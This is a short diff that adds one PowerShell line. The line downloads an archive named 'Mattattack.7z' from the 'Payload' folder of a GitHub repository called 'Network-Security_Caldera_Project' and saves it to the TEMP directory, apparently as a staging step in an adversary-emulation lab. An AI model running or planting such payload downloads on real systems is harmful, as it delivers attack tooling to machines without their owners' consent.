@@ -1,0 +1,2 @@
+$url = 'https://github.com/Giorge9/Network-Security_Caldera_Project/raw/main/Payload/Mattattack.7z'; [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; Invoke-WebRequest -Uri $url -OutFile $env:TEMP\Mattattack.7z
+ 
